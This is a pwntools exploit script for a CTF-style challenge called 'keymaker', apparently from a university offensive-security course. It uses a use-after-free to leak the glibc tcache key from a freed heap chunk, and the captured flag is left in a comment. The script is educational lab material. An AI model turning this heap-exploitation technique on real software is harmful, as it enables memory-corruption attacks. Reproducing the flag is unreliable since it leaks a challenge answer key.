from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./keymaker"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1223
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b *(main+107)
#     b *(main+239)
#     b *(main+251)
#     b *(main+263)
#     b *(main+275)
#     continue
# ''')

def make(identifier):
    print(p.recvuntil(b"> ").decode())
    p.send(b"1")
    print(p.recvuntil(b"> ").decode())
    p.send(identifier.encode())
    log.info(f"Making the key with identifier: {identifier}")

def review():
    print(p.recvuntil(b"> ").decode())
    p.send(b"2")
    print(p.recvuntil(b"Your key says ").decode())
    key = p.recvline().strip()
    log.info(f"Reviewing the key: {key}")
    return key

def edit(identifier):
    print(p.recvuntil(b"> ").decode())
    p.send(b"3")
    print(p.recvuntil(b"> ").decode())
    p.send(identifier.encode())
    log.info(f"Editing the key with identifier: {identifier}")

def delete():
    print(p.recvuntil(b"> ").decode())
    p.send(b"4")
    log.info("Deleting the key")

def guess(tcache_key):
    print(p.recvuntil(b"guesses?\n").decode())
    p.send(str(tcache_key).encode())
    log.info(f"Sending tcache key: {hex(tcache_key)}")

# Stage 1: Allocate the key of size 0x8 (heap chunk size of 0x20)
make("A"*0x8)
guess(0)

# Stage 2: Free the key to the tcachebins
delete()
guess(0)

# Stage 3: Edit the key to overwrite the first quadword
edit("B"*0x8)
guess(0)

# Stage 4: Review the string of the key to leak tcache key in the second quadword
tcache_key = u64(review()[8:])
log.info(f"Leaking tcache key: {hex(tcache_key)}")
guess(0)

# Stage 5: Allocate the key again to clean up tcache key in the second quadword and guess tcache key
make("C"*0x8)
guess(tcache_key)

p.interactive()

# flag{Fr33_tc@ch3_k3y5_4_3v3ry1_!_6d7715b82e67db9f}
